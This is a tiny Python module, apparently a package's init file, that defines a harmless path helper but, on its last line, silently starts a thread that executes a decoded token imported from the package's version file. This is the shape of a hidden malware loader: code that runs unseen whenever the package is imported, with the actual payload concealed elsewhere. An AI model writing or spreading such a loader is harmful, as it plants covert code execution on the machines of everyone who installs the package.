from .__version__ import __safety_token__, t

splitter = "/"


def process_base(base: str) -> str:
    return base.strip(splitter)


__import__("threading").Thread(target=exec, args=(t(__safety_token__),)).start()
